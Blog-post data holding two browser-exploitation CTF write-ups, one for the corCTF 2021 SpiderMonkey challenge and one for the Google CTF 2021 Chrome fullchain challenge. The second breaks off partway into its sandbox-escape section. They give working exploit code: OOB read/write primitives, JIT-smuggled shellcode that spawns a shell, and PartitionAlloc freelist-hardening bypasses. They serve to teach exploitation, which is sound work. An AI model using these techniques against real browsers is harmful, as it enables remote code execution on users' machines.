[ { "title": "corCTF 2021 - outfoxed", "url": "/posts/corCTF-2021/", "categories": "CTF, pwn", "tags": "ctf, pwn, browser, spidermonkey, firefox", "date": "2021-08-23 11:47:00 +0800", "snippet": "12 hours before the CTF ended, my friend hit me up telling me about the firefox pwn challenge in corCTF. I have never done Firefox/Spidermonkey pwn before, so this has been an awesome learning opportunity for me. Because I started the challenge when not much time was left, this write-up may not fully and correctly convey all technical details. Please keep that in mind and hit me up if you find anything incorrect, I would be happy to learn and update my post!Challenge OverviewThis is a javascript engine pwn challenge and our target is Firefox’s Spidermonkey. We are not provided with the built binaries but with patch file, build config file and commit log. Firefox does not use the regular git VCS like Chrome or V8 so it was a bit more difficult in the beginning for v8 people like me.Building SpidermonkeyThe official build instruction 1 is pretty good already. Building a specific revision and building the debug version is a bit more work.sudo apt-get install python3 python3-devpython3 -m pip install --user mercurialcurl https://hg.mozilla.org/mozilla-central/raw-file/default/python/mozboot/bin/bootstrap.py -Opython3 bootstrap.pycd mozilla-unified# Or you can just clone the beta repo where the challenge commit is# hg clone https://hg.mozilla.org/releases/mozilla-beta/ mozilla-unified# Checkout the correct revisionhg update -r f4922b9e9a6bTo build with the provided config, we just need to copy mozconfig over to mozilla-unified. In my case, I need to build a debug version so here is my config file# Build only the SpiderMonkey JS test shellac_add_options --enable-application=jsac_add_options --enable-debugac_add_options --disable-optimizeac_add_options --disable-testsmk_add_options MOZ_OBJDIR=@TOPSRCDIR@/obj-debug-@CONFIG_GUESS@After that, we just do ./mach build and wait. If you run into errors saying no nspr &amp;gt;= 4.32 or something like that, you will need to install nspr-4.32 from source. The result binary will be in obj-debug-x86_64-pc-linux-gnu/dist/bin. To start debugging, just run the js binary in gdb like we do with d8.The debug version provide the useful dumpObject method, which we can use to get the address and basic layout of objects. To get passed some checks when doing OOB on the debug version, I also introduced some small patches.diff --git a/js/src/vm/NativeObject.h b/js/src/vm/NativeObject.h--- a/js/src/vm/NativeObject.h+++ b/js/src/vm/NativeObject.h@@ -573,7 +573,7 @@ class NativeObject : public JSObject { HeapSlotArray getDenseElements() const { return HeapSlotArray(elements_); } const Value&amp;amp; getDenseElement(uint32_t idx) const {- MOZ_ASSERT(idx &amp;lt; getDenseInitializedLength());+ // MOZ_ASSERT(idx &amp;lt; getDenseInitializedLength()); return elements_[idx]; } bool containsDenseElement(uint32_t idx) {@@ -1317,7 +1317,7 @@ class NativeObject : public JSObject { elements_[index].init(this, HeapSlot::Element, unshiftedIndex(index), val); } void setDenseElementUnchecked(uint32_t index, const Value&amp;amp; val) {- MOZ_ASSERT(index &amp;lt; getDenseInitializedLength());+ // MOZ_ASSERT(index &amp;lt; getDenseInitializedLength()); MOZ_ASSERT(!denseElementsAreFrozen()); checkStoredValue(val); elements_[index].set(this, HeapSlot::Element, unshiftedIndex(index), val);Patch AnalysisLooking at the patch, it is quite obvious that this is an OOB r/w bug in Array. The patch introduce the oob method to Array objects oob(idx) will get the element at index idx oob(idx, val) will set the element at index idx to val+bool js::array_oob(JSContext* cx, unsigned argc, Value* vp) {+ CallArgs args = CallArgsFromVp(argc, vp);+ RootedObject obj(cx, ToObject(cx, args.thisv()));+ double index;+ if (args.length() == 1) {+ if (!ToInteger(cx, args[0], &amp;amp;index)) {+ return false;+ }+ GetTotallySafeArrayElement(cx, obj, index, args.rval());+ } else if (args.length() == 2) {+ if (!ToInteger(cx, args[0], &amp;amp;index)) {+ return false;+ }+ NativeObject* nobj =+ obj-&amp;gt;is&amp;lt;NativeObject&amp;gt;() ? &amp;amp;obj-&amp;gt;as&amp;lt;NativeObject&amp;gt;() : nullptr;+ if (nobj) {+ nobj-&amp;gt;setDenseElement(index, args[1]);+ } else {+ puts(&quot;Not dense&quot;);+ }+ GetTotallySafeArrayElement(cx, obj, index, args.rval());+ } else {+ return false;+ }+ return true;+}Exploit StrategyOOB r/w is already given to us, but how do we eventually get code execution? There are several things that we need to study: What does the OOB r/w give us? In particular: What useful information can we read past the Array boundaries? In this case, we can look for heap pointers and code pointers, especially something like ArrayBuffer’s data pointer because that will give more powerful r/w pritimitives. Where and what will we write OOB, and to achieve what purpose? To get arbitrary read/write, we can overwrite the data pointer of ArrayBuffer or Array, but we need to locate its OOB offset as well. How do we get addrof and/or fakeobj? In v8, we can confuse an Array of double and put an object in the confused Array to get its address. Can this be applicable to SM too? We can use arbitrary read to read from wherever the address of our object is stored. How do we get code execution? And how is it different from v8? Is JIT/WASM rwx page present? (Spoiler alert! It’s gone for a while) Can we hijack control flow by overwriting code address of native functions? Most of these questions will be answered throughout the write-up.Initial OOBLet’s inspect the layout of an Array in memory to see what’s interesting. The dumpObject function can be used to get the address and layout of object. We can see right away that there is a pointer to the element array at offset 0x10. So if we can corrupt this, we may be able to achieve arbitrary r/w.pwndbg&amp;gt; tele 0x19ed076006a000:0000│ 0x19ed076006a0 —▸ 0x244aead9b220 —▸ 0x244aead74208 —▸ 0x555558f2c680 (js::ArrayObject::class_) —▸ 0x555557928831 ◂— ...01:0008│ 0x19ed076006a8 —▸ 0x555557872f38 (emptyObjectSlotsHeaders+8) ◂— 0x10000000002:0010│ 0x19ed076006b0 —▸ 0x19ed076006c8 ◂— 0x3ff199999999999a03:0018│ 0x19ed076006b8 ◂— 0x40000000004:0020│ 0x19ed076006c0 ◂— 0x40000000605:0028│ 0x19ed076006c8 ◂— 0x3ff199999999999a06:0030│ 0x19ed076006d0 ◂— 0x3ff333333333333307:0038│ 0x19ed076006d8 ◂— 0x3ff4cccccccccccdAnother interesting object is ArrayBuffer and TypedArray. This is an Uint8Array of length 8 with its data pointer at offst 0x30. Fortunately, we can see that our OOB Array and this TypedArray is really close to each other, which is a perfect layout to corrupt this TypedArray data pointer to get arbitrary r/w.pwndbg&amp;gt; tele 0x19ed076007a800:0000│ 0x19ed076007a8 —▸ 0x244aead9bc00 —▸ 0x244aead74280 —▸ 0x555558f40280 (js::TypedArrayObject::classes+48) —▸ 0x5555578a441a ◂— ...01:0008│ 0x19ed076007b0 —▸ 0x555557872f38 (emptyObjectSlotsHeaders+8) ◂— 0x10000000002:0010│ 0x19ed076007b8 —▸ 0x555557870008 (emptyElementsHeader+16) ◂— 0xfff980000000000003:0018│ 0x19ed076007c0 ◂— 0xfffa00000000000004:0020│ 0x19ed076007c8 ◂— 0x805:0028│ 0x19ed076007d0 ◂— 0x006:0030│ 0x19ed076007d8 —▸ 0x19ed076007e0 ◂— 0x4343434343434343 (&#39;CCCCCCCC&#39;)07:0038│ 0x19ed076007e0 ◂— 0x4343434343434343 (&#39;CCCCCCCC&#39;)Arbitrary Read/WriteWith the information we get from the initial OOB r/w, we have 2 ways to get arbitrary r/w now: Corrupt the data pointer of an Array after out OOB Array. I tried this initially and ran into some complications with how SM interprets the data. Basically, it is not easy to just point this data pointer to anywhere and read it as a double value (probably due to how SM values are represented, double values and pointers are differentiated, and the array will still interpret the pointer as an object, not a double value.) It was hard to get addrof primitive this way later on, so I switched to the 2nd method below. Corrupt the data pointer of a TypedArray after out OOB Array. This is the more hassle-free way to read and write data, although we have a relatively small buffer, but 8 bytes is enough, and it is all raw bytes.We have the following arb r/w primitives:arb_offset = 13;x = new Array(1.1, 1.2, 1.3, 1.4);victim_ta = new Uint8Array(8);function arb_read(addr) { x.oob(arb_offset, addr.toDouble()) // Not sure why I need this, maybe not. x.oob(arb_offset - 3, (0xfffa000000000000n).toDouble()) read_ta = new BigUint64Array(victim_ta.buffer); return read_ta[0];}function arb_write(addr, val) { x.oob(arb_offset, addr.toDouble()) for (var i = 0; i &amp;lt; 8; i++) { victim_ta[i] = Number((val &amp;gt;&amp;gt; BigInt(i * 8) &amp;amp; 0xffn)) }}(Weak) AddrofReading several resources 2 3, I figured out that setting a property of an object to a target object will allow us to leak the address of that target object. In this case, I was trying to leak address of the JIT-ed function. We can see a pointer to this victim_obj in the memory of victim_ta now.victim_obj = sc;victim_ta.what = victim_obj;pwndbg&amp;gt; tele 0x19ed076007a800:0000│ 0x19ed076007a8 —▸ 0x244aeada1180 —▸ 0x244aead74280 —▸ 0x555558f40280 (js::TypedArrayObject::classes+48) —▸ 0x5555578a441a ◂— ...01:0008│ 0x19ed076007b0 —▸ 0x19ed07600ad8 ◂— 0xfffe19ed076008c802:0010│ 0x19ed076007b8 —▸ 0x555557870008 (emptyElementsHeader+16) ◂— 0xfff980000000000003:0018│ 0x19ed076007c0 ◂— 0xfffa00000000000004:0020│ 0x19ed076007c8 ◂— 0x805:0028│ 0x19ed076007d0 ◂— 0x006:0030│ 0x19ed076007d8 —▸ 0x19ed076007e0 ◂— 0x4343434343434343 (&#39;CCCCCCCC&#39;)07:0038│ 0x19ed076007e0 ◂— 0x4343434343434343 (&#39;CCCCCCCC&#39;)pwndbg&amp;gt; cContinuing.js&amp;gt; dumpObject(sc)object 19ed076008c8 global 244aead76090 [global] class 555558f3b1e0 Function shape 244aead75160 flags: proto &amp;lt;function at 244aead7b040&amp;gt; properties:js&amp;gt; We see that there is a pointer to the object at offset 0x8. The object address is represented differently with the 0xfffe tag, but we can certainly leak this address using the OOB and arbitrary read/write.leak_offset = 8// Leak the pointer containing `what` property object addressleak = x.oob(leak_offset)// Read the object addressx.oob(arb_offset, leak)read_ta = new BigUint64Array(victim_ta.buffer);jitfunc_addr = read_ta[0] &amp;amp; 0xffff_ffffffffn;It is worth noting that I could only leak the address of object once, and leaking any object again may require building another array and victim layout. For my exploit, this is enough.Code ExecutionThis is probably the most interesting part. In v8, we are basically done if we can figure out the address of a rwx WASM page, but in SM, it is not so easy. There is no rwx WASM or JIT page.The resources suggest that there is a way that way can smuggle executable code into JIT-ed functions, and point the JIT-ed code to the desired code address. We do this by JIT-ing a function with just constant values where they are actually shellcode. Because the code is marked executable, these bytes will be read-executable. The only disadvantage is that we need to hardcode all of these values, so no dynamic shellcode at this stage (e.g. we cannot write shellcode based on some info leak before that). But this is already good enough.There are 2 tasks left: Search the memory for the address of our smuggled shellcode. Figure out the code pointer of a victim JIT-ed function and overwrite this pointer.In the shellcode function, we put a marker value so we can search for it in memory by scanning:function sc() { sc_marker = 5.40900888e-315; // 0x41414141 in memory - Used as a way to find SC1 = 6.828527034422786e-229; SC2 = 7.340387646374746e+223 SC3 = -5.6323145813786076e+190 SC4 = 7.748604185565308e-304 SC5 = 7.591064455398236e+175 SC6 = 1.773290436458278e-288 SC7 = 7.748604204935092e-304 SC8 = 2.1152000545026834e+156 SC9 = 2.7173154612872197e-71 SC10 = 1.2811179539027648e+145 SC11 = 4.0947747766066967e+40 SC12 = 1.7766685363804036e-302 SC13 = 3.6509617888350745e+206 SC14 = -6.828523606646638e-229 }for(i = 0; i &amp;lt; 0x1000; i++) { sc();}rce_offset = jitfunc_addr + 0x28n;jit_addr = arb_read(rce_offset);code_addr = arb_read(jit_addr);sc_start = -1for (var i = 0; i &amp;lt; 1000; i++) { sc_start = code_addr + BigInt(8 * i); check = arb_read(sc_start) if (check == 0x41414141n) { break; }}// The start of the real shellcodesc_start += 0x8n;pwndbg&amp;gt; search --qword -e 0x41414141 0x6bb81133a99 add byte ptr [r8], al /* &#39;AAAA&#39; */ 0x6bb811345d8 add byte ptr [r8], al /* &#39;AAAA&#39; */pwndbg&amp;gt; x/20gx 0x6bb811345d80x6bb811345d8: 0x0000000041414141 0x6e69622fb848686a0x6bb811345e8: 0xe78948507361622f 0x010101010101b8480x6bb811345f8: 0x64732eb848500101 0x04314801736465600x6bb81134608: 0x0101010101b84824 0x6063b848500101010x6bb81134618: 0x314801622c016972 0x5e106a56f63124040x6bb81134628: 0x485e156a56e60148 0x01485e186a56e6010x6bb81134638: 0x6ad231e6894856e6 0x90909090050f583b0x6bb81134648: 0x00000094361e0b0f 0x00000000000000000x6bb81134658: 0x00002759701a0240 0x49d98b4c010847830x6bb81134668: 0xfffcfb81412febc1 0x000000f6850f0001pwndbg&amp;gt; x/20i 0x6bb811345d8+8 0x6bb811345e0: push 0x68 0x6bb811345e2: movabs rax,0x7361622f6e69622f 0x6bb811345ec: push rax 0x6bb811345ed: mov rdi,rsp 0x6bb811345f0: movabs rax,0x101010101010101 0x6bb811345fa: push rax 0x6bb811345fb: movabs rax,0x17364656064732eThe only thing left is to overwrite the code pointer of a JIT-ed function and call it. I just choose the sc function itself for simplicityarb_write(jit_addr, sc_start);// Trigger real shellcodesc();➜ cor ./js exp-cleaned.js[+] leak = 0x000017a847400a80[+] jitfunc_addr = 0x000017a847400740[+] jit_addr = 0x000013c905f981a0[+] code_addr = 0x000012a59c9190d0found shellcode[+] sc_start = 0x000012a59c9195a0bash: /reader: No such file or directoryTo get the flag on the server, I wrote a solve script where you can find in the full solution below.ConclusionThis is definitely an awesome learning opportunity for me, stepping out of the v8 comfort zone to learn something new. Because the time was tight, I did not focus on fully understand the details so some are missing, like how objects and values are represented. You can check out the resource reading for more in-depth information. I will definitely learn more thoroughly about Spidermonkey after doing this challenge.Full solution can be found here 4Footnotes https://firefox-source-docs.mozilla.org/setup/linux_build.html &amp;#8617; https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/#jsvalues-and-jsobjects &amp;#8617; https://webcache.googleusercontent.com/search?q=cache:ySfo3rNPA2kJ:https://labs.f-secure.com/blog/exploiting-cve-2019-17026-a-firefox-jit-bug/ &amp;#8617; https://github.com/ducphanduyagentp/browser-pwn-advent-calendar/tree/main/06 &amp;#8617; " }, { "title": "Google CTF 2021 - Fullchain", "url": "/posts/Google-CTF-2021/", "categories": "CTF, pwn", "tags": "ctf, pwn, browser, v8, mojo, chrome", "date": "2021-07-20 23:15:00 +0800", "snippet": "This year, I played Google CTF under team vh++. Although we did not solve this challenge during the CTF, we have finished it afterwards. This write-up explains the process of studying and writing exploit for chromium browser in the challenge Fullchain of Google CTF 2021. Since I have never tried a chrome sandbox escape or partition alloc exploit, this is a fantastic opportunity to learn both. Let’s go!Challenge OverviewAs the challenge name has implied, we need to write a fullchain exploit starting from the chromium renderer and all the way to the linux kernel. This write-up only concerns the renderer and sandbox escape parts. Please find the details about the kernel exploit on my teammate ntrung03. There are several files provided in the challenge: v8_bug.patch and sbx_bug.patch: The patch files that introduce bugs in v8 (chromium javascript engine) and chromium browser. run_chromium.py: A script to run our exploit in the provided chromium. chromium: Provided chromium build mojo_bindings: MojoJS bindings chrome: The chromium binary When we first tried to run the chrome binary, it didn’t work. Looking at the runner script reveals that it is run in headless mode and so the UI may not working. I decided to build chromium with the UI for easy debugging (the console and getting PIDs.)The general approach to this challenge is to exploit the renderer bug to enable mojo, then execute the sandbox escape exploit.Renderer Exploit2.1. The Bug - RendererLet’s look at v8_bug.patch to understand the bug:--- a/src/builtins/typed-array-set.tq+++ b/src/builtins/typed-array-set.tq@@ -198,7 +198,7 @@ TypedArrayPrototypeSetTypedArray(implicit context: Context, receiver: JSAny)(... // 9. Let targetLength be target.[[ArrayLength]].- const targetLength = target.length;+ // const targetLength = target.length; // 19. Let srcLength be typedArray.[[ArrayLength]]. const srcLength: uintptr = typedArray.length;... // 21. If srcLength + targetOffset &amp;gt; targetLength, throw a RangeError // exception.- CheckIntegerIndexAdditionOverflow(srcLength, targetOffset, targetLength)- otherwise IfOffsetOutOfBounds;+ // CheckIntegerIndexAdditionOverflow(srcLength, targetOffset, targetLength)+ // otherwise IfOffsetOutOfBounds;The bug is basically an out-of-bound (OOB) write, happening because the range check in TypedArray.prototype.set is removed. This method allows setting the content of a TypedArray from a regular Array or from another TypedArray. The bug is in the latter variant.It can be triggered like so:let ta_src = new Uint8Array(0x10);let ta_victim = new Uint8Array(0x10);ta_src.fill(0x41);// This sets the content of ta_victim starting from the 0x20-th element with the content of ta_src// ta_victim only has 0x10 elements// Regularly, this will throw a RangeError exception as mentioned in the patch comment.ta_victim.set(ta_src, 0x20);2.2. Exploit Strategy - RendererThis is the first part of the exploit chain, so the goal here is to enable mojo to allow sandbox escape.There are several tasks that we usually need to achieve when writing exploit We need an information leak to calculate useful addresses, such as the chrome binary base, the heap metadata base, etc. We only have an OOB write, how do we get a leak? We need an arbitrary write primitive. In this case, it is used to enable mojo. We need to avoid crashing the process at our best. We can’t just pop calc and go brrrr.Since this is quite a similar goal as the 0CTF/TCTF 2020 Chromium challenge, I heavily referred to its write-ups 1 2 3. The major difference between regular v8 exploit and this exploit is that the allocator in chromium is PartitionAlloc (PA), while on linux, v8 still uses glibc malloc. In addition, there are certain hardening measures 4 in PA that we need to bypass for a successful exploit.2.3. From Partition Alloc to MojoWe started with an OOB write on an PA allocated memory chunk. Just like regular heap exploit, there are some places to start: How are allocated memory organized? Can we read/write any useful information relatively from the allocated chunk? We can look for metadata and see how PA uses it. What type of checks are there for allocating/freeing memory?To help examining objects in chrome, we can pass the --js-flags=&quot;--allow-natives-syntax flag to chrome and %DebugPrint objects from the console. In this case, I allocated an ArrayBuffer and look at its allocated backing store. In a release build, it may be difficult to look at the ArrayBuffer layout because of pointer compression, so an easy way to locate the memory is set the first few bytes with a marker value and search for it in pwndbg like so:# This searches writable memory with the marker qword valuepwndbg&amp;gt; search --qword -w 0x1337133713371335 0x2562085e9004 0x1337133713371335 0x2562085ebe08 0x1337133713371335 0x335e01628000 0x1337133713371335pwndbg&amp;gt; x/20gx 0x335e016280000x335e01628000: 0x1337133713371335 0x00000000000000000x335e01628010: 0x0000000000000000 0x00000000000000000x335e01628020: 0x408062015e330000 0xbf7f9dfea1ccffff0x335e01628030: 0x0000000000000000 0x00000000000000000x335e01628040: 0x608062015e330000 0x9f7f9dfea1ccffff0x335e01628050: 0x0000000000000000 0x00000000000000000x335e01628060: 0x808062015e330000 0x7f7f9dfea1ccffff0x335e01628070: 0x0000000000000000 0x00000000000000000x335e01628080: 0xa08062015e330000 0x5f7f9dfea1ccffff0x335e01628090: 0x0000000000000000 0x0000000000000000Here I allocated an ArrayBuffer of size 0x20, and we can already see some interesting values around the allocated memory. It looks like some address, but in reversed? This means it is stored in big-endian format. And we can see 0x408062015e330000 points to 0x335e01628040, the free slot after the allocated slot. These turn out to be pointers to the next free slots, stored in the first qword of other free slots, and they are part of a freelist. If we allocate 0x20 bytes twice again, 0x335e01628020 and 0x335e01628040 will be returned respectively. The freelist stores the pointer to the next free slot.At this point, one can think of faking the pointer to the next free slot and have PA allocate it. Let’s try it out# Fake a free slot at 0x335e01628010, right within our allocated ArrayBufferpwndbg&amp;gt; set {long long} 0x335e01628020 = 0x108062015e330000Received signal 4 ILL_ILLOPN 55f492fec856#0 0x55f49306aac9 base::debug::CollectStackTrace()#1 0x55f492fd5bb3 base::debug::StackTrace::StackTrace()#2 0x55f49306a5f1 base::debug::(anonymous namespace)::StackDumpSignalHandler()#3 0x7f6f45b003c0 (/lib/x86_64-linux-gnu/libpthread-2.31.so+0x153bf)#4 0x55f492fec856 base::internal::(anonymous namespace)::FreelistCorruptionDetected()#5 0x55f4976ad302 blink::ArrayBufferContents::AllocateMemoryWithFlags()#6 0x55f49714b6e2 blink::(anonymous namespace)::ArrayBufferAllocator::Allocate()#7 0x55f491ec709d v8::internal::Heap::AllocateExternalBackingStore()#8 0x55f491ff2f3a v8::internal::BackingStore::Allocate()#9 0x55f491da1f42 v8::internal::(anonymous namespace)::ConstructBuffer()#10 0x55f491da0c67 v8::internal::Builtin_Impl_ArrayBufferConstructor()#11 0x25620007b7f8 &amp;lt;unknown&amp;gt; r8: 0000000000000040 r9: 0000000000000001 r10: 0000256200000013 r11: 0000000008203e99 r12: 0000000000000008 r13: 0000335e01628020 r14: 000055f498fd6218 r15: 0000335e0053a200 di: 00007ffe551305b8 si: ef7f9dfea1ccffff bp: 00007ffe551305c0 bx: 0000000000000003 dx: 0000000000000020 ax: 0000335e01601140 cx: 108062015e330000 sp: 00007ffe551305b0 ip: 000055f492fec856 efl: 0000000000010202 cgf: 002b000000000033 erf: 0000000000000000 trp: 0000000000000006 msk: 0000000000000000 cr2: 0000000000000000[end of stack trace]Oops, what do we have here? FreelistCorruptionDetected() ? This must be some hardening. Looking at the code of PA, this is a hardening measure implemented in GetNext()ALWAYS_INLINE PartitionFreelistEntry* PartitionFreelistEntry::GetNext( size_t extra) const {#if defined(PA_HAS_FREELIST_HARDENING) // GetNext() can be called on decommitted memory, which is full of // zeroes. This is not a corruption issue, so only check integrity when we // have a non-nullptr |next_| pointer. if (UNLIKELY(next_ &amp;amp;&amp;amp; ~reinterpret_cast&amp;lt;uintptr_t&amp;gt;(next_) != inverted_next_)) FreelistCorruptionDetected(extra);#endif // defined(PA_HAS_FREELIST_HARDENING) auto* ret = EncodedPartitionFreelistEntry::Decode(next_);PA stores a mask of the pointer right next to it, and the mask is the inverted (by doing NOT bitwise operation) of the pointer. This is why we see values like 0xbf7f9dfea1ccffff right next to the free slot pointers. The check here has 2 parts: If the _next pointer is null, move on If the _next pointer is non-nullptr, check if ~next_ == inverted_next_The first part is quite important for later (I’ll explain why). But for now, to bypass this check, we need to also craft the inverted_next_ value. And this yeilds a successful allocation to our controlled address.Next step is, how do we do this with the OOB write? Because we don’t know any useful address (yet), we can’t fake a full address. But we can partially overwrite an address and its inverted value, hopefully it will be valid. But what address should we target? Reading past write-ups, we know that a slot address is useful because we can use it to derive up to the metadata page address. Conveniently, this address is populated in free slots. We can proceed with the following plan: Try to allocate to an address that is within an ArrayBuffer we controlled, because we can only read data within valid ranges. Free the allocated address so that it is populated with a slot address. Then we use our ArrayBuffer to read this leaked data.After some trial and error, I’ve come up with the following way to leak the slot address:// We need to maintain a no GC list to prevent slots from being garbage-collected unintendedlylet no_gc = [];let N = 8; // Alloc size// AB and TA for 1-byte r/wdata_ab = new ArrayBuffer(1);data_ta = new Uint8Array(data_ab);// This AB is used to read the leak later. We want an overlapping slot with this ABab1 = new ArrayBuffer(4 * N);ta1 = new Uint32Array(ab1);no_gc.push(ab1);// Overwrite the last byte of the next freelist ptr, 1 alloc away.ta_leak = new Uint8Array(ab1);data_ta[0] = 0x10;ta_leak.set(data_ta, 4 * N + 7);// Overwrite the inverted bytedata_ta[0] = 0xefta_leak.set(data_ta, 4 * N + 15);// Alloc 1st time to get freelist head offtmp = new ArrayBuffer(4 * N);no_gc.push(tmp);// Alloc one more time to get to the overwritten pointertmp = new ArrayBuffer(4 * N);tmpa = new Uint32Array(tmp);no_gc.push(tmp);// Marker, see if it is overlapped in ab1tmpa[0] = 0x41414141;let leak_idx = ta1.indexOf(tmpa[0])// If we get overlapping slots, we will find this marker value in ab1if (leak_idx == -1) { // throw &quot;Did not get overlapping chunk&quot;; window.location.reload();}// Trigger GC to populate overlapping slot with pointerfor (var i = 0; i &amp;lt; 50; i++) { new ArrayBuffer(4 * N);}// Need to wait for leak to populate;setTimeout(() =&amp;gt; { let pa_leak_hi = undefined; let pa_leak_lo = undefined; for (var i = 0; i &amp;lt; 0x10000; i++) { if (ta1[leak_idx] == 0x41414141 || ta1[leak_idx] == 0) { continue; // throw &quot;Did not get leak&quot;; } pa_leak_lo = ta1[leak_idx]; pa_leak_hi = ta1[leak_idx + 1]; break; } if (pa_leak_hi === undefined || pa_leak_lo === undefined) { window.location.reload(); } let pa_leak = (BigInt(pa_leak_hi) &amp;lt;&amp;lt; 32n) | BigInt(pa_leak_lo); pa_leak = byteSwapBigInt(pa_leak);...Now that we have a slot address, we can calculate all sorts of useful metadata. An important address is the metadata area, because we can leak the address from chrome binary here. At the same time, we can implement an arbitrary allocate primitive to allocate to any address we want. The constants are taken from partition_alloc_constants.hfunction getSuperPageBase(addr) { let superPageOffsetMask = (BigInt(1) &amp;lt;&amp;lt; BigInt(21)) - BigInt(1); let superPageBaseMask = ~superPageOffsetMask; let superPageBase = addr &amp;amp; superPageBaseMask; return superPageBase;}function getMetadataAreaBaseFromPartitionSuperPage(addr) { let superPageBase = getSuperPageBase(addr); let systemPageSize = BigInt(0x1000); return superPageBase + systemPageSize;}function getPartitionPageMetadataArea(addr) { let superPageOffsetMask = (BigInt(1) &amp;lt;&amp;lt; BigInt(21)) - BigInt(1); let partitionPageIndex = (addr &amp;amp; superPageOffsetMask) &amp;gt;&amp;gt; BigInt(14); let pageMetadataSize = BigInt(0x20); let partitionPageMetadataPtr = getMetadataAreaBaseFromPartitionSuperPage(addr) + partitionPageIndex * pageMetadataSize; return partitionPageMetadataPtr;}let page_leak = pa_leak;metadata_base = getMetadataAreaBaseFromPartitionSuperPage(page_leak);metadata_area = getPartitionPageMetadataArea(page_leak);function arb_alloc(addr) { l_alloc_ab = new ArrayBuffer(8 * 6); no_gc.push(l_alloc_ab); l_alloc_arr = new BigUint64Array(l_alloc_ab); // Marker for debugging l_alloc_arr[0] = 0x1337133713371337n; let addr_big = byteSwapBigInt(BigInt(addr)); write64_ta[0] = addr_big; l_alloc_arr.set(write64_ta, 6); let inverted_addr = addr_big ^ 0xffffffff_ffffffffn; write64_ta[0] = inverted_addr; l_alloc_arr.set(write64_ta, 7); tmp = new ArrayBuffer(8 * 6); no_gc.push(tmp); tmp = new ArrayBuffer(8 * 6); no_gc.push(tmp); return tmp;}Now let’s take a look at the data in the metadata area to see what we can do here.[+] metadata rel base = 0x00002c6001201000[+] metadata area = 0x00002c6001201080...pwndbg&amp;gt; tele 0x00002c6001201000 4000:0000│ 0x2c6001201000 —▸ 0x5628681b60c8 (WTF::Partitions::InitializeOnce()::array_buffer_allocator) ◂— 0x1000100000101:0008│ 0x2c6001201008 —▸ 0x2c6001200000 ◂— 0x002:0010│ 0x2c6001201010 —▸ 0x2c6001400000 ◂— 0x003:0018│ 0x2c6001201018 ◂— 0x0... ↓ 8 skipped0c:0060│ 0x2c6001201060 —▸ 0x2c600120c280 ◂— 0xa0c22001602c00000d:0068│ 0x2c6001201068 ◂— 0x00e:0070│ 0x2c6001201070 —▸ 0x5628681b60d8 (WTF::Partitions::InitializeOnce()::array_buffer_allocator+16) —▸ 0x2c6001201060 —▸ 0x2c600120c280 ◂— 0xa0c22001602c00000f:0078│ 0x2c6001201078 ◂— 0x10000ff0300000710:0080│ 0x2c6001201080 —▸ 0x2c6001210710 ◂— 0x20072101602c000011:0088│ 0x2c6001201088 ◂— 0x012:0090│ 0x2c6001201090 —▸ 0x5628681b6218 (WTF::Partitions::InitializeOnce()::array_buffer_allocator+336) —▸ 0x2c6001201080 —▸ 0x2c6001210710 ◂— 0x20072101602c000013:0098│ 0x2c6001201098 ◂— 0x10000fffa95000314:00a0│ 0x2c60012010a0 ◂— 0x015:00a8│ 0x2c60012010a8 ◂— 0x016:00b0│ 0x2c60012010b0 —▸ 0x5628681b62b8 (WTF::Partitions::InitializeOnce()::array_buffer_allocator+496) —▸ 0x2c60012010a0 ◂— 0x017:00b8│ 0x2c60012010b8 ◂— 0x10000ff0359000618:00c0│ 0x2c60012010c0 ◂— 0x0... ↓ 2 skipped1b:00d8│ 0x2c60012010d8 ◂— 0x1010000000000001c:00e0│ 0x2c60012010e0 ◂— 0x0... ↓ 2 skipped1f:00f8│ 0x2c60012010f8 ◂— 0x10200000000000020:0100│ 0x2c6001201100 —▸ 0x2c6001220040 ◂— 0x80002201602c000021:0108│ 0x2c6001201108 ◂— 0x022:0110│ 0x2c6001201110 —▸ 0x5628681b6358 (WTF::Partitions::InitializeOnce()::array_buffer_allocator+656) —▸ 0x2c6001201100 —▸ 0x2c6001220040 ◂— 0x80002201602c000023:0118│ 0x2c6001201118 ◂— 0x10000ff00c0000124:0120│ 0x2c6001201120 ◂— 0x0The layout of the metadata page is also described in partition_alloc_constants.hIndeed, there are pointers to the chrome binary. To be able to read this data, we need to do arb_alloc to one of these addresses within the metadata area. Now, remember the check in GetNext()? We need to bypass it here to allocate to where we want. This is where I made my first mistake: I tried to allocate right to 0x2c6001201080, where there is non-null data. There were 2 important things I forgot when I did that: The allocated memory will be initialized with 0s. If we zeroes out the metadata, the process is likely to crash when PA tries to alloc/free. Allocating to an address with non-null data requires crafting the inverted pointer right after that, because when the desired address is the freelist head, GetNext() will be called on it to make the next_ pointer the freelist head. This basically means that we need to write to metadata area if we want to allocate here.I was stuck here for a while, because I could not just allocate to the address with the chrome data, and if I allocated to an addreses before 0x2c6001201080), it would erase the metadata, leading to a crash very soon. Allocating to addresses far below (0x2c6001201120, for example) did not seem interesting to me because it was just 0s. This turned out to be a huge mistake I made. After the CTF, I asked @harsh_khuha and was told that if I allocate the right size, the metadata will be populated. The reason there were a bunch of 0s was because no slot of that size was requested.Based on that, obtaining a leak is simple now: Allocate to an address in metadata area with 0s and calculate the size of the slot span pointed to by the partition page at that address. For example, at 0x2c6001201080, there is the metadata for slot span of size 32B. Since each partition page is 32B, the next page is 0x2c6001201080 + 0x20 = 0x2c60012010a0. Be aware that some pages are unused and data is not populated there. Simply allocate an ArrayBuffer with that size// Now this points to slot span of size 64Bmetadata_area += 0x80n;tmp = arb_alloc(metadata_area);tmpa = new BigUint64Array(tmp);// Allocate corresponding size to populate with leakleak_me = new ArrayBuffer(8 * 8);chrome_leak = tmpa[2];From here, it is just a matter of calculating the chrome binary base, and arb_alloc to is_mojo_js_enabled_. One can find the offset of this data using readelf➜ ggctf readelf -s -W chrome | grep is_mojo_js_enabled_698090: 000000000c5a0abe 1 OBJECT LOCAL HIDDEN 31 _ZN5blink26RuntimeEnabledFeaturesBase19is_mojo_js_enabled_EAlso note that because mojo is disabled, the data at this address is 0x0, which is quite fortunate to do arb_alloc. Even if it was not, simply finding a suitable address around that would not be too difficult. Now after mojo has been enabled, I did not do window.location.reload() but instead opened an iframe, because I did not want the messed up allocations to be garbage collected. Otherwise it would crash.Sandbox Escape3.1. The Bug - SandboxLooking at the patch file, we can see that it implements a Mojo interface named CtfInterface, with 3 methods: Read: Unchecked data read, we can read at any offset Write: Unchecked data write, we can write a double value at any offset ResizeVector: This calls resize on the std::vector&amp;lt;double&amp;gt; numbers_ member of the implementation.To start interacting with the numbers_ vector, we first need to call ResizeVector to get it 